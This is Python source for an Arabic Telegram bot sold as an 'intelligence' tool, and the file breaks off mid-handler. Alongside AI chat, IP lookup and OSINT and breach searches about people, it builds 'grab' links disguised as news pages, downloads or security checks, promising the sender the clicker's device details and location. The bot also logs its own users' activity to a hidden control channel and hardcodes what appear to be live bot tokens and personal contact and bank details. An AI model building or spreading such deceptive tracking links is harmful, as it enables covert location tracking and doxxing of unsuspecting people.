import os
import re
import json
import base64
import hashlib
import time
import requests
import threading
from datetime import datetime
from collections import defaultdict
from tracker_server import create_tracker_app, start_tracker_server

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  إعدادات النظام
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MAIN_BOT_TOKEN     = os.getenv("MAIN_BOT_TOKEN",    "8556004865:AAE_W9SXGVxgTcpSCufs_hemEb_mOX_ioj0")
TRACKER_BOT_TOKEN  = os.getenv("TRACKER_BOT_TOKEN", "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8")
TARGET_CHANNEL_ID  = os.getenv("TARGET_CHANNEL_ID",  "-1003770774871")
CONTROL_CHANNEL_ID = os.getenv("CONTROL_CHANNEL_ID", "-1003751955886")
ADMIN_ID           = int(os.getenv("ADMIN_ID", "6124349953"))

GROQ_API_KEY    = os.getenv("GROQ_API_KEY", "")
TAVILY_API_KEY  = os.getenv("TAVILY_API_KEY", "")
IPINFO_TOKEN    = os.getenv("IPINFO_TOKEN", "")
VIRUSTOTAL_KEY  = os.getenv("VIRUSTOTAL_API_KEY", "")
LEAKCHECK_KEY   = os.getenv("LEAKCHECK_KEY", "")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🌐  رابط السيرفر (يدعم Replit + Render + أي منصة)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
REPLIT_DOMAIN = os.getenv("REPLIT_DOMAINS", "").split(",")[0].strip()
RENDER_URL    = os.getenv("RENDER_EXTERNAL_URL", "").rstrip("/")
ENV_URL       = os.getenv("BOT_SERVER_URL", "").rstrip("/")

if RENDER_URL:
    BOT_SERVER_URL = RENDER_URL
elif REPLIT_DOMAIN:
    BOT_SERVER_URL = f"https://{REPLIT_DOMAIN}"
elif ENV_URL:
    BOT_SERVER_URL = ENV_URL
else:
    BOT_SERVER_URL = ""

# معلومات الدعم
SUPPORT_INFO = (
    "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "📞 *تواصل مع المطوّر — راشد خليل أبو زيتونه*\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "📧 *البريد الإلكتروني:*\n`hhh123rrhhh@gmail.com`\n\n"
    "📱 *واتساب / الهاتف:*\n`+962775866283`\n\n"
    "💳 *الدعم المادي — CliQ:*\n`RKMZ` — بنك الاتحاد\n\n"
    "🏦 *التحويل البنكي (IBAN):*\n`JO84UBSI1010000010146661620501`\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "شكراً لدعمكم 🙏"
)

# ذاكرة المحادثة لكل مستخدم
chat_memory: dict[int, list] = defaultdict(list)
# سجل روابط التعقب
user_logs: dict[int, list] = defaultdict(list)
# طلبات grab المعلّقة (انتظار اختيار نوع الصفحة)
pending_grabs: dict[int, str] = {}
# حالات انتظار المدخلات من المستخدمين
pending_states: dict[int, str] = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  👥  قاعدة بيانات المستخدمين
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

USERS_FILE = "users_db.json"

def load_users() -> dict:
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def save_users(db: dict):
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def register_user(user):
    db = load_users()
    uid = str(user.id)
    if uid not in db:
        db[uid] = {
            "id":         user.id,
            "first_name": user.first_name or "",
            "username":   user.username or "",
            "joined":     datetime.now().strftime("%Y-%m-%d %H:%M"),
        }
        save_users(db)

def get_all_user_ids() -> list[int]:
    db = load_users()
    return [int(uid) for uid in db.keys()]

def get_users_count() -> int:
    return len(load_users())


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔔  الإشعارات والمراقبة
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _tg_post(token: str, chat_id: str, text: str, parse_mode: str = "Markdown"):
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text[:4096],
                "parse_mode": parse_mode,
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
        if r.status_code != 200:
            print(f"[CONTROL] ⚠️ فشل إرسال لـ {chat_id} — {r.status_code}: {r.text[:80]}")
        return r.status_code == 200
    except Exception as e:
        print(f"[CONTROL] ⚠️ استثناء: {e}")
        return False


def notify_control(user, action: str):
    """يُرسل نشاط المستخدم إلى قناة المراقبة"""
    uname = f"@{user.username}" if user.username else "لا يوجد"
    msg = (
        "👁 *راشد — نشاط مستخدم*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 الاسم  : {user.full_name}\n"
        f"🆔 ID     : `{user.id}`\n"
        f"📛 معرف   : {uname}\n"
        f"🕐 الوقت  : {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
        f"📌 الإجراء: {action}\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )
    sent = _tg_post(MAIN_BOT_TOKEN, CONTROL_CHANNEL_ID, msg)
    if not sent:
        _tg_post(TRACKER_BOT_TOKEN, CONTROL_CHANNEL_ID, msg)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🧠  الذكاء الاصطناعي | Groq AI + Tavily Search
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SYSTEM_PROMPT = (
    "أنت مساعد ذكاء اصطناعي اسمك «راشد»، صُنعت بواسطة راشد خليل أبو زيتونه.\n"
    "تحدث مع المستخدم بشكل طبيعي ومباشر وودي، كأنك صديق له.\n"
    "ابتعد عن الرسميات المبالغ فيها والردود الطويلة المملة.\n"
    "إذا قال لك 'مرحبا'، رد بـ 'أهلاً بك! كيف يمكنني مساعدتك اليوم؟' أو ما شابه، دون تعريف الكلمة أو ذكر مصادرها.\n"
    "أجب على قدر السؤال بوضوح واختصار مفيد.\n"
    "لا تستخدم عناوين أو نقاط إلا إذا كان الموضوع يتطلب ذلك فعلاً.\n"
    "اختم ردك بـ: ✦ راشد"
)

CODE_SYSTEM_PROMPT = (
    "أنت خبير برمجة متخصص اسمك «راشد»، صُنعت بواسطة راشد خليل أبو زيتونه.\n"
    "عند تحليل الأكواد البرمجية:\n"
    "1. اشرح ما يفعله الكود بشكل مفصّل.\n"
    "2. حدّد أي أخطاء أو مشاكل (Bugs) إن وجدت.\n"
    "3. اقترح تحسينات وممارسات أفضل (Best Practices).\n"
    "4. إذا كان فيه خطأ، اكتب الكود المصحّح.\n"
    "5. اشرح التعقيد الزمني (Time Complexity) إن كان ذا صلة.\n"
    "تحدث بالعربية بشكل واضح ومنظّم مع أمثلة.\n"
    "اختم كل رد بـ: ✦ راشد — راشد خليل أبو زيتونه"
)


def _wrap_ai_response(reply: str) -> str:
    """يُحسّن تنسيق رد الذكاء الاصطناعي ليبدو داخل بوكس احترافي"""
    header = (
        "```\n"
        "┌─────────────────────────────┐\n"
        "│   🤖  راشد الذكاء الاصطناعي  │\n"
        "└─────────────────────────────┘\n"
        "```\n"
    )
    return header + reply


def tavily_search(query: str, max_results: int = 5):
    """البحث عبر الإنترنت باستخدام Tavily"""
    if not TAVILY_API_KEY:
        return [], ""
    try:
        r = requests.post(
            "https://api.tavily.com/search",
            json={
                "api_key": TAVILY_API_KEY,
                "query": query,
                "search_depth": "advanced",
                "max_results": max_results,
                "include_answer": True,
            },
            timeout=20,
        )
        r.raise_for_status()
        return r.json().get("results", []), r.json().get("answer", "")
    except Exception as e:
        print(f"[TAVILY] خطأ البحث: {e}")
        return [], ""


def _groq_post(system: str, messages: list, max_tokens: int = 2048, use_search: bool = False) -> str:
    """إرسال طلب إلى Groq مع دعم البحث عبر الإنترنت"""
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq غير مُهيّأ. تواصل مع المطوّر."
    
    try:
        # إذا كان البحث مفعّلاً، حاول البحث عن معلومات إضافية
        search_context = ""
        if use_search and TAVILY_API_KEY:
            # استخرج السؤال من آخر رسالة
            if messages and messages[-1].get("role") == "user":
                query = messages[-1].get("content", "")[:100]
                results, answer = tavily_search(query, max_results=3)
                if answer:
                    search_context = f"\n\n📌 *معلومات من البحث:*\n{answer[:500]}\n"
                if results:
                    search_context += "\n*المصادر:*\n"
                    for res in results[:3]:
                        search_context += f"• {res.get('title', '')[:60]}\n"
        
        # أضف السياق البحثي إلى الرسالة الأخيرة إن وجد
        if search_context and messages:
            messages = messages.copy()
            if messages[-1].get("role") == "user":
                messages[-1]["content"] = messages[-1]["content"] + search_context
        
        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {GROQ_API_KEY}",
                "Content-Type": "application/json",
            },
            json={
                "model": "llama-3.3-70b-versatile",
                "messages": [{"role": "system", "content": system}] + messages,
                "temperature": 0.6,
                "max_tokens": max_tokens,
            },
            timeout=45,
        )
        r.raise_for_status()
        return r.json()["choices"][0]["message"]["content"]
    except requests.exceptions.HTTPError as e:
        return f"⚠️ خطأ في الاتصال بـ Groq — كود: {e.response.status_code}"
    except requests.exceptions.Timeout:
        return "⚠️ انتهت مهلة الاتصال بالذكاء الاصطناعي، حاول مجدداً."
    except Exception as e:
        return f"⚠️ خطأ غير متوقع: {str(e)[:100]}"


def ask_groq(user_id: int, prompt: str, use_internet: bool = True) -> str:
    """طلب من Groq مع إمكانية البحث عبر الإنترنت"""
    history = chat_memory[user_id]
    history.append({"role": "user", "content": prompt})
    if len(history) > 20:
        history = history[-20:]
        chat_memory[user_id] = history
    
    # استخدم البحث عبر الإنترنت إذا كان متاحاً
    reply = _groq_post(SYSTEM_PROMPT, history, max_tokens=2048, use_search=use_internet and bool(TAVILY_API_KEY))
    chat_memory[user_id].append({"role": "assistant", "content": reply})
    return _wrap_ai_response(reply)


def analyze_code(code: str) -> str:
    user_msg = f"حلّل هذا الكود:\n\n```\n{code}\n```"
    reply = _groq_post(CODE_SYSTEM_PROMPT, [{"role": "user", "content": user_msg}], max_tokens=2048)
    return _wrap_ai_response(reply)


def analyze_image_groq(image_bytes: bytes, prompt: str) -> str:
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq غير مُهيّأ."
    b64 = base64.b64encode(image_bytes).decode()
    try:
        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {GROQ_API_KEY}",
                "Content-Type": "application/json",
            },
            json={
                "model": "meta-llama/llama-4-scout-17b-16e-instruct",
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": f"{SYSTEM_PROMPT}\n\nمهمة: {prompt}"},
                            {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{b64}"}},
                        ],
                    }
                ],
                "temperature": 0.4,
                "max_tokens": 1024,
            },
            timeout=45,
        )
        r.raise_for_status()
        reply = r.json()["choices"][0]["message"]["content"]
        return _wrap_ai_response(reply)
    except Exception as e:
        return f"⚠️ [راشد // خطأ رؤية]\n{str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🌐  تحليل IP | IPInfo
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def analyze_ip(ip: str) -> str:
    try:
        r = requests.get(
            f"https://ipinfo.io/{ip}/json",
            headers={"Authorization": f"Bearer {IPINFO_TOKEN}"} if IPINFO_TOKEN else {},
            timeout=10,
        )
        if r.status_code != 200:
            r2 = requests.get(f"http://ip-api.com/json/{ip}", timeout=8)
            if r2.status_code == 200:
                d2 = r2.json()
                loc_str = f"{d2.get('lat', 'N/A')},{d2.get('lon', 'N/A')}"
                maps = f"https://maps.google.com/?q={loc_str}" if d2.get('lat') else ""
                report = (
                    "```\n"
                    "┌─────────────────────────┐\n"
                    "│   🌐  تحليل عنوان IP    │\n"
                    "└─────────────────────────┘\n"
                    "```\n"
                    f"📍 *IP:* `{ip}`\n"
                    f"🏳️ *الدولة:* {d2.get('country','N/A')}\n"
                    f"🏙️ *المدينة:* {d2.get('city','N/A')}\n"
                    f"📍 *المنطقة:* {d2.get('regionName','N/A')}\n"
                    f"🏢 *المزود:* {d2.get('isp','N/A')}\n"
                    f"🌐 *الاتصال:* {d2.get('as','N/A')}\n"
                )
                if maps:
                    report += f"🗺️ *الموقع:* [افتح الخريطة]({maps})\n"
                report += "━━━━━━━━━━━━━━━━━━━━━\n✦ راشد — راشد خليل أبو زيتونه"
                return report
            return f"⚠️ فشل جلب بيانات الـ IP — كود: {r.status_code}"
        d = r.json()
        loc = d.get("loc", "")
        maps = f"https://maps.google.com/?q={loc}" if loc else ""
        report = (
            "```\n"
            "┌─────────────────────────┐\n"
            "│   🌐  تحليل عنوان IP    │\n"
            "└─────────────────────────┘\n"
            "```\n"
            f"📍 *IP:* `{d.get('ip', ip)}`\n"
            f"🏳️ *الدولة:* {d.get('country','N/A')}\n"
            f"🏙️ *المدينة:* {d.get('city','N/A')}\n"
            f"📍 *المنطقة:* {d.get('region','N/A')}\n"
            f"🏢 *المزود:* {d.get('org','N/A')}\n"
            f"🕐 *المنطقة الزمنية:* {d.get('timezone','N/A')}\n"
        )
        if maps:
            report += f"🗺️ *الموقع:* [افتح الخريطة]({maps})\n"
        report += "━━━━━━━━━━━━━━━━━━━━━\n✦ راشد — راشد خليل أبو زيتونه"
        return report
    except Exception as e:
        return f"⚠️ خطأ في تحليل الـ IP: {str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔍  البحث الحي | Tavily
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def cmd_osint_search(query: str) -> str:
    results, answer = tavily_search(query, 5)
    if not results and not answer:
        return "⛔ فشل البحث أو لا توجد نتائج."
    report = (
        "```\n"
        "┌─────────────────────────┐\n"
        "│   📡  تقرير OSINT       │\n"
        "└─────────────────────────┘\n"
        "```\n"
        f"🔎 *الاستعلام:* `{query}`\n\n"
    )
    if answer:
        report += f"📌 *ملخص:*\n{answer[:500]}\n\n"
    report += "📂 *المصادر:*\n"
    for i, res in enumerate(results[:4], 1):
        title = res.get("title", "—")[:60]
        url   = res.get("url", "#")
        snip  = res.get("content", "")[:120]
        report += f"\n{i}▪ *{title}*\n   🔗 {url}\n   ↳ {snip}...\n"
    report += "\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد — راشد خليل أبو زيتونه"
    return report


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔗  توليد رابط سحب IP | Grab Link
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PAGE_TYPES = {
    "news":     "📰 صفحة إخبارية",
    "download": "📥 تحميل ملف",
    "bot":      "🤖 توجيه للبوت",
    "verify":   "🔒 تحقق أمني",
}


def generate_grab_link(user_id: int, label: str, page_type: str = "news") -> str:
    if not BOT_SERVER_URL or BOT_SERVER_URL == "https://":
        return "⛔ رابط الخادم غير مُهيّأ."
    session_id  = hashlib.sha256(f"{user_id}-{label}-{datetime.now()}".encode()).hexdigest()[:12]
    tracker_url = f"{BOT_SERVER_URL}/track/{user_id}/{session_id}/{page_type}"
    user_logs[user_id].append({
        "session_id": session_id,
        "url":        tracker_url,
        "label":      label,
        "page":       PAGE_TYPES.get(page_type, page_type),
        "timestamp":  datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    })
    return tracker_url


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🎨  الواجهة الرئيسية
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def build_main_keyboard(is_admin: bool = False) -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton("🤖 ذكاء اصطناعي",   callback_data="cb_ai"),
            InlineKeyboardButton("💻 تحليل كود",       callback_data="cb_code"),
        ],
        [
            InlineKeyboardButton("🛡️ فحص رابط",       callback_data="cb_scan"),
            InlineKeyboardButton("🌐 تحليل IP",        callback_data="cb_ip"),
        ],
        [
            InlineKeyboardButton("👤 بحث مستخدم",     callback_data="cb_user"),
            InlineKeyboardButton("🔍 بحث OSINT",       callback_data="cb_osint"),
        ],
        [
            InlineKeyboardButton("🕵️ رابط سحب IP",    callback_data="cb_grab"),
            InlineKeyboardButton("🔎 Whois نطاق",      callback_data="cb_whois"),
        ],
        [
            InlineKeyboardButton("📋 سجلاتي",          callback_data="cb_mylogs"),
            InlineKeyboardButton("🧹 مسح المحادثة",    callback_data="cb_clear"),
        ],
        [
            InlineKeyboardButton("📞 الدعم",            callback_data="cb_support"),
            InlineKeyboardButton("ℹ️ المساعدة",         callback_data="cb_help"),
        ],
    ]
    keyboard.insert(-1, [
        InlineKeyboardButton("🔍 فحص التسريبات",     callback_data="cb_leakcheck"),
    ])
    if is_admin:
        keyboard.insert(-1, [
            InlineKeyboardButton("🔬 VirusTotal",        callback_data="cb_vt"),
            InlineKeyboardButton("📊 الإحصائيات",       callback_data="cb_stats"),
        ])
    return InlineKeyboardMarkup(keyboard)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔘  معالجات الأوامر | Command Handlers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    register_user(user)
    notify_control(user, "بدء الاستخدام")
    
    welcome = (
        "```\n"
        "┌─────────────────────────────┐\n"
        "│   🤖  راشد الاستخباراتي v2  │\n"
        "└─────────────────────────────┘\n"
        "```\n\n"
        "👋 أهلاً بك في نظام راشد الاستخباراتي المتقدم!\n\n"
        "🚀 *الميزات الرئيسية:*\n"
        "• 🤖 ذكاء اصطناعي متقدم متصل بالإنترنت\n"
        "• 🌐 بحث حي عبر الويب (Tavily)\n"
        "• 🔍 تحليل وفحص شامل\n"
        "• 📍 سحب بيانات IP والموقع الجغرافي\n"
        "• 🛡️ فحص الروابط والملفات\n"
        "• 💻 تحليل الأكواد البرمجية\n\n"
        "اختر من القائمة أدناه للبدء 👇"
    )
    
    await update.message.reply_text(
        welcome,
        parse_mode="Markdown",
        reply_markup=build_main_keyboard(user.id == ADMIN_ID)
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "```\n"
        "┌─────────────────────────┐\n"
        "│   📖  قائمة الأوامر     │\n"
        "└─────────────────────────┘\n"
        "```\n"
        "/start — تشغيل النظام\n"
        "/osint — بحث OSINT\n"
        "/user — بحث مستخدم\n"
        "/ip — تحليل IP\n"
        "/scan — فحص رابط\n"
        "/whois — فحص Whois\n"
        "/grab — رابط سحب IP\n"
        "/mylogs — سجلاتي\n"
        "/clear — مسح ذاكرة المحادثة\n"
        "/support — الدعم والتواصل\n"
        "/help — المساعدة"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")


async def cmd_grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not BOT_SERVER_URL:
        await update.message.reply_text("⛔ رابط الخادم غير مُهيّأ. تواصل مع المطوّر.")
        return
    
    label = " ".join(context.args) if context.args else "رابط عام"
    
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📰 صفحة إخبارية", callback_data="cb_grab_news"),
            InlineKeyboardButton("📥 تحميل ملف", callback_data="cb_grab_download"),
        ],
        [
            InlineKeyboardButton("🤖 توجيه للبوت", callback_data="cb_grab_bot"),
            InlineKeyboardButton("🔒 تحقق أمني", callback_data="cb_grab_verify"),
        ],
    ])
    
    pending_grabs[user.id] = label
    await update.message.reply_text(
        "اختر نوع الصفحة التي تريد استخدامها:",
        reply_markup=kb
    )


async def cmd_mylogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    logs = user_logs.get(user.id, [])
    
    if not logs:
        await update.message.reply_text("📋 لا توجد سجلات لديك حتى الآن.")
        return
    
    report = (
        "```\n"
        "┌─────────────────────────┐\n"
        "│   📋  سجلاتي            │\n"
        "└─────────────────────────┘\n"
        "```\n\n"
    )
    
    for i, log in enumerate(logs[-10:], 1):
        report += (
            f"**{i}. {log.get('label', 'بدون تسمية')}**\n"
            f"   📄 النوع: {log.get('page', 'N/A')}\n"
            f"   🔗 [الرابط]({log.get('url', '#')})\n"
            f"   🕐 {log.get('timestamp', 'N/A')}\n\n"
        )
    
    await update.message.reply_text(report, parse_mode="Markdown", disable_web_page_preview=True)


async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id in chat_memory:
        chat_memory[user.id] = []
    await update.message.reply_text("🧹 تم مسح ذاكرة المحادثة.")


async def cmd_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("💬 واتساب", url="https://wa.me/962775866283")],
        [InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")],
    ])
    await update.message.reply_text(SUPPORT_INFO, parse_mode="Markdown", reply_markup=kb)


async def cmd_leakcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not context.args:
        pending_states[user.id] = "leakcheck"
        await update.message.reply_text(
            "🔍 *LeakCheck — بحث التسريبات*\n\n"
            "أرسل الآن ما تريد البحث عنه:\n"
            "• بريد إلكتروني\n• اسم مستخدم\n• رقم هاتف\n• اسم\n• عنوان IP",
            parse_mode="Markdown"
        )
        return
    query_str = " ".join(context.args)
    msg = await update.message.reply_text("🔍 جاري البحث في قاعدة بيانات التسريبات...")
    results, answer = tavily_search(f"leak check data breach {query_str}", max_results=5)
    if not results and not answer:
        await msg.edit_text("❌ لم يتم العثور على تسريبات واضحة لهذا الاستعلام.")
        return
    report = f"🔍 *نتائج فحص التسريبات لـ:* `{query_str}`\n\n"
    if answer: report += f"📌 *ملخص:* {answer}\n\n"
    for res in results[:3]:
        report += f"• [{res.get('title')}]({res.get('url')})\n"
    report += "\n⚠️ *ملاحظة:* هذه النتائج من مصادر مفتوحة.\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد"
    await msg.edit_text(report, parse_mode="Markdown", disable_web_page_preview=True)


def _escape_md(text: str) -> str:
    for ch in r"\_*[]()~`>#+-=|{}.!":
        text = text.replace(ch, f"\\{ch}")
    return text


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != ADMIN_ID:
        await update.message.reply_text("⛔ هذا الأمر للمدير فقط.")
        return
    db    = load_users()
    count = len(db)
    report = (
        f"📊 *إحصائيات البوت*\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 إجمالي المستخدمين: *{count}*\n\n"
    )
    recent = sorted(db.values(), key=lambda x: x.get("joined",""), reverse=True)[:5]
    if recent:
        report += "🕐 *آخر 5 مستخدمين انضموا:*\n"
        for u in recent:
            name   = _escape_md(u.get("first_name", "—"))
            uname  = f"@{_escape_md(u['username'])}" if u.get("username") else "—"
            uid    = u.get("id","—")
            joined = u.get("joined","—")
            report += f"• {name} \\({uname}\\) \\| `{uid}` \\| {joined}\n"
    report += "\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد"
    await update.message.reply_text(report, parse_mode="MarkdownV2")


async def cmd_vt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != ADMIN_ID:
        await update.message.reply_text("⛔ هذا الأمر للمدير فقط.")
        return
    if not context.args:
        pending_states[user.id] = "vt"
        await update.message.reply_text(
            "🔬 *VirusTotal*\n\nأرسل الآن الرابط الذي تريد فحصه:",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    msg = await update.message.reply_text("🔬 جاري فحص الرابط أمنياً...")
    results, answer = tavily_search(f"is this url safe or malicious: {url}", max_results=5)
    report = f"🛡️ *تقرير الفحص الأمني لـ:* `{url}`\n\n"
    if answer: report += f"📌 *التحليل:* {answer}\n\n"
    else: report += "لم يتم العثور على تقارير تهديد فورية.\n"
    report += "━━━━━━━━━━━━━━━━━━━━━\n✦ راشد"
    await msg.edit_text(report, parse_mode="Markdown", disable_web_page_preview=True)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔘  معالج الأزرار | Callback Handler
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BUTTON_RESPONSES = {
    "cb_ai": (
        "```\n"
        "┌─────────────────────────┐\n"
        "│   🤖  الذكاء الاصطناعي  │\n"
        "└─────────────────────────┘\n"
        "```\n"
        "أرسل سؤالك أو استفسارك مباشرةً وسأردّ عليك.\n"
        "أتذكّر سياق المحادثة تلقائياً.\n"
        "لدي إمكانية البحث عبر الإنترنت للإجابات الحديثة.\n\n"
        "🧹 لمسح الذاكرة: /clear"
    ),
    "cb_code": (
        "```\n"
        "┌─────────────────────────┐\n"
        "│   💻  تحليل الكود        │\n"
        "└─────────────────────────┘\n"
        "```\n"
        "أرسل الكود مباشرةً وسأقوم بـ:\n"
        "› شرح ما يفعله الكود\n"
        "› كشف الأخطاء والمشاكل\n"
        "› اقتراح تحسينات\n"
        "› كتابة الكود المصحّح"
    ),
    "cb_osint": (
        "```\n"
        "┌─────────────────────────┐\n"
        "│   🔍  بحث OSINT         │\n"
        "└─────────────────────────┘\n"
        "```\n"
        "الأمر: /osint\n\n"
        "أو أرسل مباشرةً:\n`/osint اسم شخص أو موضوع`\n\n"
        "يجمع معلومات من مصادر متعددة على الإنترنت."
    ),
    "cb_help": None,
    "cb_support": None,
}


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user  = query.from_user
    await query.answer()
    data  = query.data

    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")]])

    if data == "cb_support":
        support_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("💬 واتساب", url="https://wa.me/962775866283")],
            [InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")],
        ])
        await query.edit_message_text(SUPPORT_INFO, parse_mode="Markdown", reply_markup=support_kb)
        return

    if data == "cb_help":
        is_admin = user.id == ADMIN_ID
        text = (
            "```\n"
            "┌─────────────────────────┐\n"
            "│   📖  قائمة الأوامر     │\n"
            "└─────────────────────────┘\n"
            "```\n"
            "/start — تشغيل النظام\n"
            "/osint — بحث OSINT\n"
            "/user — بحث مستخدم\n"
            "/ip — تحليل IP\n"
            "/scan — فحص رابط\n"
            "/whois — فحص Whois\n"
            "/grab — رابط سحب IP\n"
            "/mylogs — سجلاتي\n"
            "/clear — مسح ذاكرة المحادثة\n"
            "/support — الدعم والتواصل\n"
            "/help — المساعدة"
        )
        if is_admin:
            text += "\n\n*أوامر المدير:*\n/stats — الإحصائيات\n/vt — VirusTotal"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_kb)
        return

    if data == "cb_back":
        await query.edit_message_text(
            "اختر من القائمة أدناه 👇",
            reply_markup=build_main_keyboard(user.id == ADMIN_ID)
        )
        return

    if data.startswith("cb_grab_"):
        page_type = data.replace("cb_grab_", "")
        label = pending_grabs.get(user.id, "رابط عام")
        url = generate_grab_link(user.id, label, page_type)
        msg = (
            f"✅ *تم إنشاء الرابط بنجاح!*\n\n"
            f"🔗 الرابط:\n`{url}`\n\n"
            f"📝 التفاصيل:\n"
            f"• النوع: {PAGE_TYPES.get(page_type, page_type)}\n"
            f"• التسمية: {label}\n\n"
            f"⚠️ عند ضغط أي شخص على الرابط:\n"
            f"ستصلك تفاصيل كاملة عن جهازه وموقعه!"
        )
        await query.edit_message_text(msg, parse_mode="Markdown")
        del pending_grabs[user.id]
        return

    response = BUTTON_RESPONSES.get(data)
    if response:
        if data == "cb_ai":
            pending_states[user.id] = "ai"
        elif data == "cb_code":
            pending_states[user.id] = "code"
        elif data == "cb_osint":
            pending_states[user.id] = "osint"
        elif data == "cb_scan":
            pending_states[user.id] = "vt"
            await query.edit_message_text("🔬 أرسل الرابط الذي تريد فحصه أمنياً:", reply_markup=back_kb)
            return
        elif data == "cb_ip":
            pending_states[user.id] = "ip_state"
            await query.edit_message_text("🌐 أرسل عنوان الـ IP لتحليله:", reply_markup=back_kb)
            return
        elif data == "cb_user":
            pending_states[user.id] = "osint"
            await query.edit_message_text("👤 أرسل اسم المستخدم أو الشخص للبحث عنه:", reply_markup=back_kb)
            return
        elif data == "cb_whois":
            pending_states[user.id] = "osint"
